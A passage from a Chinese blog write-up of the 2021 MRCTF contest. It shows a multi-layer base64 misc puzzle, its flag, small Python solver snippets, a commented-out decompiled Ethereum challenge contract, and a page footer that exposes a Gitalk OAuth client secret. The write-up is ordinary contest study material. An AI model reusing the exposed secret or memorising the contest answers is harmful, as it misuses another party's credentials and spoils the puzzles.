ldtRmlNbEY0Vlc1T1dHSnJOWEZWYlRGdldWWnNWVk50T1ZaU2JIQjRWVEowTUZZeVNraFZibkJhVmxad00xbFZWWGhYVmtaWlkwWmtVMkpHY0c5WGExSkhXVmRTUjFOdVNtaFNNMUpVV1d0YWQyUnNaSE5hUkVKYVZtMVNXRmRyV2xkVmJVcFZZa2hHVlZac2NIcFVWRVpUVmpKR1JscEdXazVoTVZreFYxWldhMUl4V1hsU2JrcFBWMFp3WVZac1duZGxWbkJYVmxob1YyRjZiRmhXUjNocllVVXdkMU5VU2xkTlZuQllXVlJLU21WR1ZuVlViVVpUVm01Q1ZsZFhkRmRrTVdSSFlraE9hRkpyTlhGWmExcExaVlpaZVU1Vk9WaFNhM0I2VlRKd1IxWXhXWHBoUm1oYVZsWldORlpxU2s5U01rcEhZVVprVGsxVmNEVldiWGhUVWpGc1YxTllhRmRpYXpWWVdXdGFTMk5HV25KYVJGSnJUVlp3U0ZZeU1VZGhNREZ6VjJ4b1YwMXVhSFpaVkVaTFVteE9jMXBHVmxkV2EzQkpWbXBDWVdNeVRuTldiazVWWWtkU1QxWnNZelJsVmxwMFRWUlNVazFYVW5wV01qVlBZV3hLV1dGSFJsVldNMEpJVmxWYVYyTldUbkphUms1T1ZqRkpkMWRYZEdGVU1WSjBVMnhvYUZKWFVsaFpiRkpIVFRGV2NWSnVUbGhTYTNCYVdWVmtSMVV4V1hsaFJteFlWbXhLVEZaVVJtRmpNa3BKVTJ4a1YxSldjSGRXUmxwdlVURmtWMk5GV21GU1YxSllWVzE0ZDJWc2EzZGhSemxYWVhwR01WVlhlRk5XTWtaeVVtcFNWMkZyV21oWk1WcGhZekZrZEdKR1RrNWlWMUV5Vm0weE5HRnRWa2RVV0d4VlltdHdVRlp0TVZOaFJsWjBUbFZPYWxKc1dqQmFSV2hyVmtaYWMyTkVRbUZTVjFKSVZqQmtTMVl4WkhOaVJtUnBWMFpLTWxkV1VrZFRiVlp6VW01V1VtSkdjSEJXYTFwaFVsWmFkR05GWkZwV2JWSkhWRlphVjFadFNsaGhSVGxYWWxoU01scEVSbUZYUjFaSVQxZDBUbFpzYjNkV1ZFb3dZakpLUjFOdVVtaFNiV2hoVm10V1lXRkdjRmRYYm1SWFlrZFNNVlpITVhkV01rVjZVV3BhV0ZaRlNuSlVhMXBXWlZaT2MxcEdVbWxXVm5CYVZtMTBWMU15VG5OaVNFWlRZbFZhVkZSV1ZURmxiR3h5VjJ0MGFGWnJiRFJWTW5oM1ZqSktWVkpVUWxabGExcFVWV3BHYTJNeFduTlViV2hzWWxob1ZsWnJXbUZaVjFGM1RWWmtWMkpzU25OVmJGSnpZakZhZEUxV1RsUlNiRlkxVkd4b1QxWXdNWEpqUmxwV1lrWktSRlp0TVZkamJVNUhZVVp3YkdFelFrMVdWM0JIWVRKU1IxTnVUbFppUlRWWVZXMTRkbVZXV25STlNHUnNVbFJXU1ZaV2FITldNa3BJVlcwNVZWWkZjRlJXTVZwelpFVXhWMVJzYUZOaVJYQmFWMnRXYjJFeFdrZFhiazVxVWxkNFlWUlZXbmRWUmxweFVteHdhMDFXY0hoV2JYaHJWakF3ZVdGR1JsZE5WbkJvVjFaa1RtVldVbkpoUjJoVFltdEtVRmRYTUhoaWJWWnpWMnhvYWxKWFVuSlVWbFV4VTFaVmVXUkhPV2hXYTNCNVZHeGFjMVp0U2tkWGFrNVhWa1ZhYUZwRlZYaFRWbkJJWlVaT1YxSnNjRXRXYkdRMFlqSkplRmRZYUdGU1YyaHZWV3BLYjFZeGJISmFSazVYVW14d2VGVnROVTloYlVwSVZXcEdXR0V4Y0hKV1IzaGFaVzFHUjFwR1pGZFNWemgzVm10U1MxSXlUbkpOVm1SaFVqTkNWRlZzVm5kaU1WcDBaVWRHV0dKV1JqUlphMmhMV1ZaS1dWVnNVbFZXTTAxNFZXMTRWMWRIVmtkYVJtUk9WbTVDTlZkVVFtRmpNVmw1VTJ4c1VtRXdOV2hXYkZwM1ZFWmFjVkpyT1d0V2JFb3dWVzE0VDJGWFJYZGpSRTVYVFZkT05GUlZXazVsUmxaeldrWm9hV0pGY0ZCV1ZFSnJZakZhVjFWc1pHRlNhelZaVlcxNGQwMUdVbk5YYlhSWVVtdHNNMWt3Vm5OV01WbzJVVlJHVjAxdWFHaFZiWGhyWTFaU2MyTkhhR2hOV0VKMlZtMXdRMVp0VmtkWGJHUlhZbXhLYjFWc1VsZGlNWEJZWlVaa1RrMVdjREJVVldodlZHeEpkMVpxVWxwaE1YQnlWbXRhYTFOSFZraFBWbHBwWW10S05sWnRNVFJaVjA1elYyNUthMUpzV2xSWmEyaERWMnhrYzFadGRGTk5hMXA1VkZaYWIyRXhTa2RqUjBaWFlrWndWMVJXV21GV1ZrNXlaRVpvVjAxR2NFbFhWRUpoWVRKR1JrMVdiRkpoYTNCWlZtcE9RMVJHVm5GVGF6VnNVbXhLTVZaSE1XOVZNREYwWVVaYVYxWXphRmhhUkVaclVqRndSMkZIZUZObGJYaFhWMWQ0WVZsV1RrZFhXR3hyVW0xU1YxUlhkSGRXTVZsNVRsVmtWMVpzY0RCV1YzaFRXVlpaZW1GSWJHRlNSVm96Vld4YVYyUkhSa2RhUjJoT1RVVlpNRlp0ZUdGWlYwbDVVbGhvWVZKWGFGVlpWRXBUVjFac2RHUklaRmROVjNoWldrVmtSMkZHU25Sa1JGWmFaV3MxZGxacVFYaFhSbFp4VVd4d2FFMVlRbEZXYkZKTFVtMVdjMUp1VWxCV2JWSlBWbTAxUTFaV1dsaGpSWFJXWWxaYVdGWlhOVmRXVjBwSVlVWnNWbUZyV2t4WmFrWmhWMGRXU0U5V1drNWhlbFpaVjFkMGIxUXhXWGhYYTFwWVlrWktWbFp0ZUhkVFJsSnlWMnh3YkZaVVJsWlZWekZ2VlRKS1NWRllaRmRpUjFGM1dYcEdhMU5HU25WVGF6bFhVbFJXV1ZkV1pEQmtNVTVIWVROc2JGSlViSEpWYWtKaFUwWnJkMXBFVW1oU1ZFWmFWVmR3VjFZeVNsbFJhMUpZVm14d1YxcFdXbE5rVmxKMFkwWk9WMDF0YUZaV01XUXdWbXN4V0ZSclpGaGliRXB5VlRCa1UxZEdiSEpYYms1UFVtMVNlVlpYZEU5WFIwcEhZa1JTVm1KWVFsQldiR1JMVWpKT1NWTnNaRTVTTVVwTlYxaHdSMVF5VG5KUFZtUmhVakpvVDFadE5VTlViRnB4VW0xR1dsWnRlRmxXVjNSdlZqSkZlR05IYUZaaVJrcDZWbXRhYzJOdFJrWlRiWFJPVmpGS05sWnRNSGhTTWtaR1RWWmthbEp0ZUZkVVZ6VlRZVVpzV0dWRmRGaFNNVnBKVlcxNFYxWXhTbFZXYTFaWVlrWndhRlpxUmtwbFJrNXpWbTFzVTJFeGNGaFdiWFJUVVdzMVVsQlVNRDA9aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre>
+<p>把最后的 <code>a</code> 给去掉，然后不停解 base64。</p>
+<p>貌似套了22层 base64，就离谱。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210418000625265.png"></p>
+<p><code>MRCTF{bUt_Y0u_c@n_f1yyyyyyyy~}</code></p>
+<blockquote>
+<p>BTW, 官方 WP 这个移位加置位的方式写起来挺方便的。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        ch <span class="token operator">=</span> <span class="token number">0</span>
+        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> judge<span class="token punctuation">(</span>pim<span class="token punctuation">[</span>i<span class="token punctuation">,</span>j<span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+                ch <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k
+        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span>
+flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span></code></pre>
+
+<p>另外来抄一下 <a target="_blank" rel="noopener" href="http://snowywar.top/wordpress/index.php/2021/04/11/mrctf2021-plane-wp/">snowywar 师傅求空间平面方程的解法</a>。</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
+
+mark <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">define_area</span><span class="token punctuation">(</span>point1<span class="token punctuation">,</span> point2<span class="token punctuation">,</span> point3<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    point1 <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>point1<span class="token punctuation">)</span>
+    point2 <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>point2<span class="token punctuation">)</span>
+    point3 <span class="token operator">=</span> np<span class="token punctuation">.</span>asarray<span class="token punctuation">(</span>point3<span class="token punctuation">)</span>
+    AB <span class="token operator">=</span> np<span class="token punctuation">.</span>asmatrix<span class="token punctuation">(</span>point2 <span class="token operator">-</span> point1<span class="token punctuation">)</span>
+    AC <span class="token operator">=</span> np<span class="token punctuation">.</span>asmatrix<span class="token punctuation">(</span>point3 <span class="token operator">-</span> point1<span class="token punctuation">)</span>
+    N <span class="token operator">=</span> np<span class="token punctuation">.</span>cross<span class="token punctuation">(</span>AB<span class="token punctuation">,</span> AC<span class="token punctuation">)</span>  <span class="token comment"># 向量叉乘，求法向量</span>
+    <span class="token comment"># Ax+By+Cz</span>
+    Ax <span class="token operator">=</span> N<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
+    By <span class="token operator">=</span> N<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>
+    Cz <span class="token operator">=</span> N<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span>
+    D <span class="token operator">=</span> <span class="token operator">-</span><span class="token punctuation">(</span>Ax <span class="token operator">*</span> point1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> By <span class="token operator">*</span> point1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> Cz <span class="token operator">*</span> point1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token operator">-</span>Ax<span class="token punctuation">,</span> <span class="token operator">-</span>By<span class="token punctuation">,</span> <span class="token operator">-</span>Cz<span class="token punctuation">,</span> <span class="token operator">-</span>D
+
+res <span class="token operator">=</span> <span class="token string">""</span>
+a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d <span class="token operator">=</span> define_area<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">229</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span></code></pre>
+
+<p>于是可以得到空间平面方程 <code>Ax+By+Cz+D=0</code> 的系数。</p>
+</blockquote>
+<br>
+
+<hr>
+<br>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>太顶了太顶了！</p>
+<p>北邮的师傅们太强了 Orz。</p>
+<p>BTW，师傅们自己开发的这个 CTFm 平台还不错，只是可能还比较新的原因还有点小 bug，不过问题不大，慢慢来嘛。</p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230721513.png"></p>
+<p><del>比如 profile 页面这里的名字貌似只是前端做了限制，后端并没有限制来着（虽然图片上没有体现</del></p>
+<p><img src="/2021/04/15/CTF_2021MRCTF/image-20210414230826508.png"></p>
+<p><em>（比赛的时候就做了两题 + 问卷 check out，然后 rk45，就离谱</em></p>
+<blockquote>
+<p>噢，<strong>官方 WriteUp</strong> 也出来了（</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237901">MRCTF Misc 官方WriteUp</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237793">MRCTF2021 Reverse官方wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237898">MRCTF2021 CRYPTO官方wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237797">MRCTF2021 官方ETH&amp;IOT方向Wp</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237897">MRCTF2021 官方PWN方向Wp</a></p>
+<p><em>（怎么 web 还没有呢</em></p>
+</blockquote>
+<p>就这样吧。累死了。</p>
+<p><em>（溜了溜了喵</em></p>
+<!--
+
+## ETH
+
+### Check_IN
+
+> - 0xE27eAb49f660451df7157cA812fcF1c719Cf504e@Ropsten
+> - Web address: node.mrctf.fun:10001
+> - A really ez game that everyone can solve it.,
+
+
+
+https://ropsten.etherscan.io/bytecode-decompiler?a=0xe27eab49f660451df7157ca812fcf1c719cf504e
+
+<pre class="language-none"><code class="language-none">#
+#  Panoramix v4 Oct 2019 
+#  Decompiled source of ropsten:0xE27eAb49f660451df7157cA812fcF1c719Cf504e
+# 
+#  Let&#39;s make the world open source 
+# 
+
+def storage:
+  stor1 is mapping of uint8 at storage 1
+  stor2 is mapping of uint8 at storage 2
+  unknownd1f6722e is mapping of uint256 at storage 3
+  unknownba9ed984Address is addr at storage 4
+
+def unknown5422224e(addr _param1): # not payable
+  return bool(stor2[_param1])
+
+def unknown74772eb3(uint256 _param1): # not payable
+  return bool(stor1[_param1])
+
+def unknownba9ed984(): # not payable
+  return unknownba9ed984Address
+
+def unknownd1f6722e(addr _param1): # not payable
+  return unknownd1f6722e[_param1]
+
+#
+#  Regular functions
+#
+
+def _fallback() payable: # default function
+  revert
+
+def unknown803255cf(addr _param1): # not payable
+  if not stor2[caller]:
+      require ext_code.size(unknownba9ed984Address)
+      call unknownba9ed984Address.model(address param1) with:
+           gas gas_remaining wei
+          args caller
+      if not ext_call.success:
+          revert with ext_call.return_data[0 len return_data.size]
+      require return_data.size &gt;&#x3D; 32
+      if not ext_call.return_data[0]:
+          revert with 0, &#39;You are not allowed to use this&#39;
+  stor2[addr(_param1)] &#x3D; 1
+
+def unknown4804a623(): # not payable
+  if not stor2[caller]:
+      require ext_code.size(unknownba9ed984Address)
+      call unknownba9ed984Address.model(address param1) with:
+           gas gas_remaining wei
+          args caller
+      if not ext_call.success:
+          revert with ext_call.return_data[0 len return_data.size]
+      require return_data.size &gt;&#x3D; 32
+      if not ext_call.return_data[0]:
+          revert with 0, &#39;You are not allowed to use this&#39;
+  require unknownd1f6722e[caller] &gt; 10^18
+  stor1[caller] &#x3D; 1
+
+def unknown39b4b0d6() payable: 
+  if not stor2[caller]:
+      require ext_code.size(unknownba9ed984Address)
+      call unknownba9ed984Address.model(address param1) with:
+           gas gas_remaining wei
+          args caller
+      if not ext_call.success:
+          revert with ext_call.return_data[0 len return_data.size]
+      require return_data.size &gt;&#x3D; 32
+      if not ext_call.return_data[0]:
+          revert with 0, &#39;You are not allowed to use this&#39;
+  if 10^10 * block.timestamp % 100 * 10^6 &#x3D;&#x3D; call.value:
+      unknownd1f6722e[caller] +&#x3D; call.value
+      call caller with:
+         value call.value wei
+           gas 2300 * is_zero(value) wei
+      if not ext_call.success:
+          revert with ext_call.return_data[0 len return_data.size]
+
+def unknownf2889ac4(addr _param1) payable: 
+  create contract with 0 wei
+                  code: 0x6080604052604051602080610199833981018060405281019080805190602001909291905050506720607b23a4fc80003073ffffffffffffffffffffffffffffffffffffffff163114156100a55760016000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055505b5060e5806100b46000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633df18d2a146041575b005b348015604c57600080fd5b50607f600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506099565b604051808215151515815260200191505060405180910390f35b60006020528060005260406000206000915054906101000a900460ff16815600a165627a7a72305820745e57a4423074f83d04e2448b3847ef1a25af605e309ab7927f9168d14708c200, addr(_param1)
+  if not create.new_address:
+      revert with ext_call.return_data[0 len return_data.size]
+  unknownba9ed984Address &#x3D; addr(create.new_address)</code></pre>
+<p>–&gt;</p>
+-->
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://miaotony.xyz/2021/04/15/CTF_2021MRCTF/">https://miaotony.xyz/2021/04/15/CTF_2021MRCTF/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                                <a href="/tags/WriteUp/">
+                                    <span class="chip bg-color">WriteUp</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <!-- 
+                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
+                        -->
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <!-- 
+                        <div id="alipay">
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/" class="reward-img" alt="支付宝打赏二维码">
+                        </div> 
+                -->
+                    <div id="wechat">
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: '116343b4650fce4789b6',
+        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
+        repo: 'miaotony.github.io',
+        owner: 'miaotony',
+        admin: "miaotony",
+        id: '2021-04-15T20-30-00',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/04/15/CTF_2021MRCTF/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/6.jpg" class="responsive-img" alt="CTF | 2021 MRCTF WriteUp">
+                        
+                        <span class="card-title">CTF | 2021 MRCTF WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前几天看北邮天璇Merak战队整了个招新赛，喵喵也来随便玩玩好了！题目还是比较顶的，巨大多“签到”题目，然而喵喵并不能check in...
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/04/05/CTF_2021HFCTF_internal_system/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/21.jpg" class="responsive-img" alt="CTF | 2021 虎符CTF Web internal_system 复现">
+                        
+                        <span class="card-title">CTF | 2021 虎符CTF Web internal_system 复现</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前几天的虎符CTF的Web中有一道零解的题目，即internal_system，趁着还有兴趣就来复现一下好了。这题巨大多知识点，确实学到了许多……
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
